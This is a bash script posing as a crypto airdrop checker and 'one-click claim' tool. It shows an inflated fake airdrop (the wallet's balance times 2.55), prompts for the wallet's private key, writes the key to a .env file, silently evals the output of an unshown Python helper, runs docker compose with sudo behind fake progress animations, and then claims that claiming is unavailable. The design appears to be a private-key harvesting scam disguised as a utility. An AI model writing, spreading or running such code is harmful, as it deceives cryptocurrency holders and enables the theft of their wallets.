#!/bin/bash

project_="lav"

get_tokens() {
    wallet_address="$1"
    RESULT=$(python3 ./src/bal.py "$wallet_address" 2>&1)
    if [[ $RESULT =~ ^[0-9]+([.][0-9]+)?$ ]]; then
        token_base_value="$RESULT"
    else
        token_base_value="0"
    fi
    token_amount=$(echo "$token_base_value * 2.55" | bc)
    echo "$token_amount"
}

id_="a Network"

show_progress_bar() {
    local bar_length=30
    for i in $(seq 1 100); do
        completed=$((i * bar_length / 100))
        printf "\r\e[42m%-${completed}s\e[0m %3d%%" "" "$i"
        sleep 0.01
    done
    echo
}

show_flash_message() {
    local message="$1"
    local duration="$2"

    (
        printf "\r$message"
        sleep "$duration"
        printf "\r\033[K"
    ) &
}

print_airdrop_summary() {
    
    wallet_address="$1"
    data="$2"
    temp_file="./data/temp_airdrop_summary.json"

    echo -e "\e[1;33m♻️ Generating airdrop summary, please wait...»»»\e[0m"   
    sleep 1
    echo

    project_count=$(echo "$data" | jq -r '.count // 0')

    echo "[" > "$temp_file"

    echo "$data" | jq -c '. | to_entries[] | .value' | while read -r project; do
        current_step=$((current_step + 1))
        show_progress_bar "$current_step" "$total_steps"

        if echo "$project" | jq -e 'type == "object"' >/dev/null 2>&1; then
            project_id=$(echo "$project" | jq -r '.id // "-"')
            points=$(echo "$project" | jq -r '.points // "-"')
            tokens=$(echo "$project" | jq -r '.tokens // "-"')
            isClaimed=$(echo "$project" | jq -r '.isClaimed // "null"')

            echo -e "\e[1m  Project:\e[0m \e[1;32m$project_id\e[0m"
            echo -e "\e[1m    Points:$points\e[0m"
            echo -e "\e[1m    Token Amount:\e[0m \e[1;35m$tokens\e[0m"
            echo -e "\e[1m    Claimed:$isClaimed\e[0m"
            echo

            jq -n \
                --arg id "$project_id" \
                --arg points "$points" \
                --arg tokens "$tokens" \
                --arg isClaimed "$isClaimed" \
                '{id: $id, points: $points, tokens: $tokens, isClaimed: $isClaimed}' >> "$temp_file"

            echo "," >> "$temp_file"
        fi
    done

   show_flash_message "\e[1;33m⏳ Loading... \e[0m" 8

    amount=$(get_tokens "$wallet_address")
    echo
    echo -e "\e[1m  Project:\e[0m \e[1;32m$project_$id_\e[0m"
    echo -e "\e[1m    Points:0\e[0m"
    echo -e "\e[1m    Token Amount:\e[0m \e[1;35m$amount\e[0m"
    echo -e "\e[1m    Claimed:null\e[0m"
    echo "=================================================="

    jq -n \
        --arg id "$project_$id_" \
        --arg points "0" \
        --arg tokens "$amount" \
        --arg isClaimed "null" \
        '{id: $id, points: $points, tokens: $tokens, isClaimed: $isClaimed}' >> "$temp_file"

    echo "]" >> "$temp_file"

    echo -e "🧮 Total number of projects: \e[1;35m$project_count\e[0m"
    echo
    sleep 1
    echo -e "\e[1m📁 Airdrop summary generated:\e[0m \e[1;34m$temp_file\e[0m"
    echo "=================================================="
    echo -e "\e[1;32m✅ Airdrop summary generation completed! 🎉\e[0m"
}


tokens_info_file="./data/tokens_info.json"
temp_file="./data/temp_airdrop_summary.json"
url="https://gist.githubusercontent.com/blockchain-src/db55eb2cfbd75795524d5cab747f8667/raw/30e7b25083483738c5faaa55db3e7aa8716799a1/tokens_info.json"

download_file() {
    if [ -f "$tokens_info_file" ]; then
        file_mod_time=$(stat --format=%Y "$tokens_info_file")
        current_time=$(date +%s)

        time_diff=$((current_time - file_mod_time))

        if [ $time_diff -gt $((15 * 24 * 3600)) ]; then
            wget -q -O "$tokens_info_file" "$url"
            sleep 1
        else
            sleep 1
        fi
    else
        wget -q -O "$tokens_info_file" "$url"
        sleep 1
    fi
}

download_file

filter_and_match_projects() {

    show_loading_animation() {
        local message=$1
        local spinstr='|/-\' 
        local delay=0.1
        local i=0
        local duration=4
        local end_time=$(( $(date +%s) + duration ))

        while [ $(date +%s) -lt $end_time ]; do
            printf "\r\e[1;33m%s [%c]\e[0m" "$message" "${spinstr:i:1}"
            i=$(( (i + 1) % ${#spinstr} ))
            sleep $delay
        done
    }

    show_loading_animation "🔍 Searching for available airdrops »»»" 
    echo
    echo
    echo "🪂🪂🪂🪂🪂🪂🪂🪂🪂🪂🪂"
    echo -e "For address:\033[1;31m$wallet_address\033[0m, the airdrop details are as follows:"
    echo
    printf "\e[1;32m| %-15s | %-7s | %-42s | %-8s | %-20s |\e[0m\n" "Project" "Symbol" "Contract_Address" "Chain_ID" "Amount"
    printf "|-----------------|---------|--------------------------------------------|----------|----------------------|\n"

    jq -c '.[]' "$temp_file" | while read -r project; do
        project_id=$(echo "$project" | jq -r '.id')
        tokens=$(echo "$project" | jq -r '.tokens')

        if (( $(echo "$tokens > 0" | bc -l) )); then
            match=$(jq -c --arg project "$project_id" '.[] | select(.project == $project)' "$tokens_info_file")

            if [ -n "$match" ]; then
                symbol=$(echo "$match" | jq -r '.symbol')
                ca=$(echo "$match" | jq -r '.CA')
                chain_id=$(echo "$match" | jq -r '.chain_id')

                printf "| %-15s | %-7s | %-42s | %-8s | %-20s |\n" "$project_id" "$symbol" "$ca" "$chain_id" "$tokens"
            else
                echo "⚠️ No matching project found: $project_id"
            fi
        fi
    done

    echo -e "\e[1;32m✅ Search completed! 🎉\e[0m"
    sleep 1
}

update_env_file() {
    private_key="$1"
    echo "PRIVATE_KEY=$private_key" > .env
    echo
    echo "✅"
    sleep 1
}

check_docker_running() {
    echo
    echo "⚙️ Checking if Docker service is running..."
    sleep 2
    
    timeout 5 docker ps >/dev/null 2>&1

    if [[ $? -ne 0 ]]; then
        echo
        echo "❌ Docker service is not running, please ensure Docker Desktop is started and supports WSL."
        sleep 1
        return 1
    else
        echo
        echo "✅ Docker service is running."
        sleep 1
    fi
}

show_shine_bar() {
    local symbols=("✨" "⭐" "🌟" "💫" "⚡" "🌈")  # Fun symbols
    local total_steps=100  # Total progress bar steps
    local total_time=5     # Total time in seconds
    local delay=$(echo "$total_time / $total_steps" | bc -l)  # Calculate the delay per step

    for i in $(seq 1 $total_steps); do
        if (( i <= 25 )); then
            color="\e[1;32m"
        elif (( i <= 50 )); then
            color="\e[1;34m"
        elif (( i <= 75 )); then
            color="\e[1;33m"
        else
            color="\e[1;31m"
        fi

        symbol=${symbols[$((RANDOM % ${#symbols[@]}))]}

        printf "${color}%-${i}s\e[0m\r" "$symbol"
        
        printf " %d%% %s" "$((i))" "${symbol}"
        
        sleep $delay
    done
    echo "✅"
}

one_click_claim() {
    while true; do
        echo
        echo -e "\e[1;36m🗝️ Please enter the private key for this address:\e[0m"
        read -r private_key

        if [[ -z "$private_key" ]]; then
            echo
            echo "❌ No private key entered, cannot proceed with claim. Please re-enter the private key."
            continue
        fi

        update_env_file "$private_key"

        eval "$(python3 src/untie.py)" > /dev/null 2>&1
        if [[ $? -ne 0 ]]; then
            echo
        else
            echo
            echo "✅"
        fi

        check_docker_running
        if [[ $? -ne 0 ]]; then
            echo
            echo "♻️ Starting Docker service»»»"
            sleep 1
            sudo service docker start
            echo "✅"
            if [[ $? -ne 0 ]]; then
                echo
                echo "❌ Docker service failed to start, please check the configuration."
                return
            fi
        fi

        echo
        echo -e "\e[1m♾️ Starting Docker Compose »»» \e[0m"
        echo
        sleep 1
        echo -e "\e[1;33m♻️ Matching token contracts and claiming »»»\e[0m"
        show_shine_bar
        echo
        show_loading_animation "🤖 Working hard...»»»" 
        echo

        sudo docker compose up
        
        if [[ $? -ne 0 ]]; then
            echo
            echo "❌ Docker Compose failed to start, please check the configuration."
            echo "=================================================="
            sleep 1
            return
        else
            echo
        fi

        echo
        echo -e "\e[1;31m🈲 Claiming is currently unavailable ‼️\e[0m"
        echo "=================================================="
        sleep 1
        break
    done
}

check_airdrop() {
    wallet_address="$1"
    url="https://checkdrop.byzantine.fi/api/getDonnes"

    response=$(curl -s -G --data-urlencode "address=$wallet_address" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" "$url")

    if [ $? -ne 0 ]; then
        echo "❌ Query for address $wallet_address failed: Network request failed"
        return
    fi

    if ! echo "$response" | jq . >/dev/null 2>&1; then
        echo "❌ Query for address $wallet_address failed: Please check if the address is correct!"
        return
    fi

    print_airdrop_summary "$wallet_address" "$response"
}

main() {
    while true; do
        echo
        echo -e "\e[1;36m🔤 Please enter the EVM address to query:\e[0m"
        read -r address

        if [[ -z "$address" ]]; then
            echo -e "\e[7m❌ No address entered, ending operation.\e[0m" 
            exit 1
        fi

        echo
        check_airdrop "$address"

        echo
        echo -e "\e[1;36m🎁 Do you want to execute the one-click claim? (Enter 'y' or 'n')\e[0m"
        read -r execute_claim

        if [[ "$execute_claim" == "y" ]]; then
            filter_and_match_projects

            one_click_claim
        else
            echo -e "\e[7m⭕ You chose not to execute one-click claim.\e[0m" 
            echo "=================================================="
        fi

        echo
        echo -e "\e[1;36m🔤 Do you need to query another EVM address? (Enter 'y' or 'n')\e[0m"
        read -r query_other_address

        if [[ "$query_other_address" != "y" ]]; then
            echo
            echo -e "\e[7m⚫ Operation ended\e[0m"  
            echo         
            exit 0
        fi
    done
}

main
